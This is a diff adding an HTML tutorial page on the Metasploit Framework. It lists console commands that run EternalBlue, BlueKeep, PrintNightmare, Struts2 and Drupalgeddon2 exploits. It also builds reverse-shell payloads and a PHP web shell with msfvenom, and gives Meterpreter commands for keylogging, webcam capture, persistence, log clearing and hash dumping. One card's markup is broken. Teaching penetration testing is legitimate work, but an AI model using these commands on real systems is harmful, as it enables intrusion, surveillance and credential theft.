@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h6 class="mb-0">Metasploit Framework</h6>
+                    </div>
+                    <div class="card-body p-0">
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#architecture" class="text-success text-decoration-none">Architecture</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#basic-usage" class="text-success text-decoration-none">Basic Usage</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#exploits" class="text-success text-decoration-none">Exploits</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#payloads" class="text-success text-decoration-none">Payloads</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#meterpreter" class="text-success text-decoration-none">Meterpreter</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-bomb"></i> Metasploit Framework</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction">
+                            <h2 class="text-success">Introduction to Metasploit</h2>
+                            <p>Metasploit is the world's most used penetration testing framework. It provides information about security vulnerabilities and aids in penetration testing and IDS signature development.</p>
+                            
+                            <div class="alert alert-info mt-4">
+                                <h4 class="text-primary"><i class="fas fa-lightbulb"></i> Core Theory</h4>
+                                <p>Metasploit is like a Swiss Army knife for penetration testing. It standardizes and automates the exploit development process, turning complex security research into repeatable, reliable tools. Think of it as having a library of proven attack techniques at your fingertips.</p>
+                            </div>
+
+                            <h3 class="text-success mt-4">Exploit Development Theory</h3>
+                            <p>Understanding Metasploit requires knowledge of exploit development fundamentals:</p>
+                            <ol>
+                                <li><strong>Vulnerability Research:</strong> Identifying security flaws in software</li>
+                                <li><strong>Exploit Development:</strong> Creating code to leverage vulnerabilities</li>
+                                <li><strong>Payload Delivery:</strong> Executing code on target systems</li>
+                                <li><strong>Post-Exploitation:</strong> Maintaining access and gathering intelligence</li>
+                                <li><strong>Evasion Techniques:</strong> Bypassing security controls</li>
+                            </ol>
+
+                            <h3 class="text-success mt-4">Metasploit Architecture</h3>
+                            <div class="card bg-dark text-white mt-3">
+                                <div class="card-header">
+                                    <h5><i class="fas fa-cogs"></i> Framework Components</h5>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Meterpreter:</strong> Advanced payload</li>
+                                        <li><strong>Auxiliary Modules:</strong> Scanners, fuzzers</li>
+                                        <li><strong>Social Engineering:</strong> SET integration</li>
+                                        <li><strong>Reporting:</strong> Professional reports</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Architecture Section -->
+                        <section id="architecture" class="mb-5">
+                            <h2 class="text-success">Metasploit Architecture</h2>
+                            
+                            <h3 class="text-success mt-4">Core Components</h3>
+                            <div class="code-block">
+# Metasploit Directory Structure
+/usr/share/metasploit-framework/
+├── modules/
+│   ├── exploits/     # Exploit modules
+│   ├── payloads/     # Payload modules  
+│   ├── auxiliary/    # Auxiliary modules
+│   ├── post/         # Post-exploitation
+│   ├── encoders/     # Payload encoders
+│   └── nops/         # NOP generators
+├── data/             # Data files
+├── lib/              # Core libraries
+└── tools/            # Standalone tools
+                            </div>
+
+                            <h3 class="text-success mt-4">Module Types</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Exploits</h5>
+                                            <p>Code that takes advantage of vulnerabilities</p>
+                                            <div class="terminal">
+use exploit/windows/smb/ms17_010_eternalblue
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Payloads</h5>
+                                            <p>Code executed after successful exploitation</p>
+                                            <div class="terminal">
+set payload windows/x64/meterpreter/reverse_tcp
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Basic Usage Section -->
+                        <section id="basic-usage" class="mb-5">
+                            <h2 class="text-success">Basic Metasploit Usage</h2>
+                            
+                            <h3 class="text-success mt-4">Starting Metasploit</h3>
+                            <div class="terminal">
+# Start PostgreSQL database
+systemctl start postgresql
+
+# Initialize Metasploit database
+msfdb init
+
+# Start Metasploit console
+msfconsole
+
+# Check database connection
+db_status
+                            </div>
+
+                            <h3 class="text-success mt-4">Essential Commands</h3>
+                            <div class="terminal">
+# Search for modules
+search ms17-010
+search type:exploit platform:windows
+
+# Use a module
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show module information
+info
+show options
+show targets
+show payloads
+
+# Set options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.10
+set payload windows/x64/meterpreter/reverse_tcp
+
+# Run the exploit
+exploit
+run
+                            </div>
+
+                            <h3 class="text-success mt-4">Workspace Management</h3>
+                            <div class="terminal">
+# List workspaces
+workspace
+
+# Create new workspace
+workspace -a pentest_2024
+
+# Switch workspace
+workspace pentest_2024
+
+# Delete workspace
+workspace -d old_workspace
+                            </div>
+                        </section>
+
+                        <!-- Exploits Section -->
+                        <section id="exploits" class="mb-5">
+                            <h2 class="text-success">Popular Exploits</h2>
+                            
+                            <h3 class="text-success mt-4">Windows Exploits</h3>
+                            <div class="terminal">
+# EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit
+
+# BlueKeep (CVE-2019-0708)
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+
+# PrintNightmare (CVE-2021-1675)
+use exploit/windows/dcerpc/cve_2021_1675_printnightmare
+set RHOSTS 192.168.1.100
+set SMBUser username
+set SMBPass password
+exploit
+                            </div>
+
+                            <h3 class="text-success mt-4">Web Application Exploits</h3>
+                            <div class="terminal">
+# Apache Struts2 (CVE-2017-5638)
+use exploit/multi/http/struts2_content_type_ognl
+set RHOSTS 192.168.1.100
+set RPORT 8080
+set TARGETURI /struts2-showcase/
+exploit
+
+# Drupal Drupalgeddon2 (CVE-2018-7600)
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS 192.168.1.100
+set TARGETURI /drupal/
+exploit
+                            </div>
+                        </section>
+
+                        <!-- Payloads Section -->
+                        <section id="payloads" class="mb-5">
+                            <h2 class="text-success">Payload Types</h2>
+                            
+                            <h3 class="text-success mt-4">Payload Categories</h3>
+                            <div class="row">
+                                <div class="col-md-4">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Singles</h5>
+                                            <p>Self-contained payloads</p>
+                                            <div class="terminal">
+windows/shell_reverse_tcp
+linux/x86/shell_reverse_tcp
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-4">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Stagers</h5>
+                                            <p>Small payloads that download larger ones</p>
+                                            <div class="terminal">
+windows/meterpreter/reverse_tcp
+linux/x86/meterpreter/reverse_tcp
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-4">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Stages</h5>
+                                            <p>Downloaded by stagers</p>
+                                            <div class="terminal">
+windows/meterpreter
+linux/x86/meterpreter
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Payload Generation</h3>
+                            <div class="terminal">
+# Generate standalone executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
+
+# Generate shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
+
+# Generate PHP web shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
+
+# Generate Android APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk
+                            </div>
+                        </section>
+
+                        <!-- Meterpreter Section -->
+                        <section id="meterpreter" class="mb-5">
+                            <h2 class="text-success">Meterpreter Advanced Payload</h2>
+                            
+                            <h3 class="text-success mt-4">Core Commands</h3>
+                            <div class="terminal">
+# System information
+sysinfo
+getuid
+getpid
+
+# File system operations
+pwd
+ls
+cd /path/to/directory
+download file.txt
+upload local_file.txt remote_file.txt
+
+# Process management
+ps
+migrate 1234
+kill 5678
+
+# Network operations
+netstat
+portfwd add -l 8080 -p 80 -r 192.168.1.100
+route add 10.0.0.0/24 1
+                            </div>
+
+                            <h3 class="text-success mt-4">Advanced Features</h3>
+                            <div class="terminal">
+# Screenshot
+screenshot
+
+# Keylogger
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# Webcam
+webcam_list
+webcam_snap
+
+# Privilege escalation
+getsystem
+getprivs
+
+# Persistence
+run persistence -X -i 5 -p 4444 -r 192.168.1.10
+
+# Clear event logs
+clearev
+                            </div>
+
+                            <h3 class="text-success mt-4">Post-Exploitation Modules</h3>
+                            <div class="terminal">
+# Background current session
+background
+
+# Use post-exploitation module
+use post/windows/gather/hashdump
+set SESSION 1
+run
+
+# Credential gathering
+use post/windows/gather/credentials/windows_autologin
+use post/windows/gather/smart_hashdump
+
+# Lateral movement
+use post/windows/gather/enum_domain
+use post/windows/gather/enum_shares
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="d-flex justify-content-between mt-5">
+                            <a href="nmap.html" class="btn btn-outline-success">
+                                <i class="fas fa-arrow-left"></i> Previous: Nmap
+                            </a>
+                            <a href="wireshark.html" class="btn btn-success">
+                                Next: Wireshark <i class="fas fa-arrow-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
+                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
